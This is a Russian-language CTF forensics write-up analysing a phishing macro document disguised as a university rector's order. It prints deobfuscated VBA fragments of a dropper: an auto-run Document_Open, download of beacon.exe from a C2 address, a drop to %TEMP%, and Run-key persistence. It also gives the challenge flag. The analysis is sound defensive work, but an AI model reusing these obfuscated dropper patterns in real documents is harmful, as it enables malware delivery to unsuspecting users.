# Райтап: Приказ ректора

**Категория:** DOCM Forensics / Malware Analysis
**Сложность:** Easy
**Флаг:** `rcpiss{1t_ju5t_f15h1n9_60cm}`

---

## 1. Первичный осмотр

Получен файл `Prikaz_KubGTU_2024_1547.docm`. Расширение `.docm` указывает на документ Microsoft Word с поддержкой макросов. Это первый red flag — официальные приказы обычно распространяются в формате `.pdf` или `.docx`.

Проверим тип файла:

```bash
file Prikaz_KubGTU_2024_1547.docm
# Microsoft Word 2007+, macro-enabled
```

## 2. Извлечение VBA-макросов

Используем `olevba` из пакета `oletools` для извлечения VBA-кода без открытия документа:

```bash
pip install oletools
olevba Prikaz_KubGTU_2024_1547.docm
```

Результат показывает два VBA-компонента:
- **ThisDocument** — содержит `Document_Open()` (автозапуск при открытии)
- **modUpdate** — вспомогательный модуль с `AutoExec()` и функциями обфускации

## 3. Анализ ThisDocument — Document_Open()

### Stage 1: C2-адрес (Chr-массив)

```vba
Dim x(15) As Long
x(0) = 49: x(1) = 57: x(2) = 50: x(3) = 46
x(4) = 49: x(5) = 54: x(6) = 56: x(7) = 46
x(8) = 52: x(9) = 55: x(10) = 46: x(11) = 49
x(12) = 51: x(13) = 56
```

Декодируем `Chr()` значения:

```
49→'1', 57→'9', 50→'2', 46→'.'
49→'1', 54→'6', 56→'8', 46→'.'
52→'4', 55→'7', 46→'.', 49→'1'
51→'3', 56→'8'
```

**IoC: C2 IP = `192.168.47.138`**

### Stage 2: URL загрузки (StrReverse)

```vba
p1 = Chr(104) & Chr(116) & Chr(116) & Chr(112)   ' → "http"
p2 = Chr(58) & Chr(47) & Chr(47)                   ' → "://"
p3 = Chr(47) & StrReverse("exe.nocaeb")             ' → "/beacon.exe"
```

**IoC: URL = `http://192.168.47.138/beacon.exe`**

### Stage 3: HTTP-клиент (StrReverse)

```vba
Set oHTTP = CreateObject(StrReverse("tseuqeR.5.ptTH.PXLMX"))
```

Переворачиваем: `XMLHTTP.5.HTTP.Request` — стандартный COM-объект для HTTP-запросов.

Файл сохраняется как:
```vba
sPath = Environ(StrReverse("PMET")) & Chr(92) & StrReverse("exe.cvs_tpd")
```
- `StrReverse("PMET")` → `TEMP`
- `Chr(92)` → `\`
- `StrReverse("exe.cvs_tpd")` → `dpt_svc.exe`

**IoC: Drop path = `%TEMP%\dpt_svc.exe`**

### Stage 4: Persistence (Registry)

```vba
Set wsh = CreateObject(StrReverse("llehS.tpircSW"))
rKey = StrReverse("nuR" & Chr(92) & "noisreVtnerruC" & Chr(92) & ...)
```

После деобфускации:
**IoC: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\KubGTU_Updater`**

### Stage 5: Флаг (Chr-массив)

```vba
k(0) = 114: k(1) = 99: k(2) = 112: k(3) = 105
k(4) = 115: k(5) = 115: k(6) = 123: k(7) = 49
k(8) = 116: k(9) = 95: k(10) = 106: k(11) = 117
k(12) = 53: k(13) = 116: k(14) = 95: k(15) = 102
k(16) = 49: k(17) = 53: k(18) = 104: k(19) = 49
k(20) = 110: k(21) = 57: k(22) = 95: k(23) = 54
k(24) = 48: k(25) = 99: k(26) = 109: k(27) = 125
```

Декодируем в Python:

```python
k = [114,99,112,105,115,115,123,49,116,95,106,117,
     53,116,95,102,49,53,104,49,110,57,95,54,48,99,109,125]
print(''.join(chr(c) for c in k))
```

Результат: **`rcpiss{1t_ju5t_f15h1n9_60cm}`**

Файл записывается в `%TEMP%\flag.txt`.

## 4. Анализ modUpdate — вторичный дроп (XOR)

Модуль `modUpdate` содержит функцию `dA()` — XOR-декодер с ключом `0x17`:

```vba
Private Function dA(arr() As Long, ln As Long) As String
    For j = 0 To ln - 1
        r = r & Chr(arr(j) Xor &H17)
    Next j
    dA = r
End Function
```

XOR-закодированный массив:

```vba
e(0) = 101: e(1) = 118: e(2) = 103: e(3) = 114 ...
```

Декодируем:

```python
e = [101,118,103,114,98,98,60,38,99,78,125,98,
     36,99,78,117,38,36,127,38,121,46,78,33,39,118,124,50]
print(''.join(chr(c ^ 0x17) for c in e))
```

Тот же флаг: **`rcpiss{1t_ju5t_f15h1n9_60cm}`**

Записывается в `%TEMP%\svchost.log` — замаскирован под системный лог.

## 5. Сводка IoC

| Индикатор | Значение |
|---|---|
| C2 IP | `192.168.47.138` |
| C2 URL | `http://192.168.47.138/beacon.exe` |
| Dropper | `%TEMP%\dpt_svc.exe` |
| Persistence | `HKCU\...\Run\KubGTU_Updater` |
| Flag drop 1 | `%TEMP%\flag.txt` |
| Flag drop 2 | `%TEMP%\svchost.log` |
| Триггер | `Document_Open()` + `AutoExec()` |

## 6. Флаг

```
rcpiss{1t_ju5t_f15h1n9_60cm}
```

> *"it just fishing docm"* — лит-спик отсылка к фишинговому .docm документу.
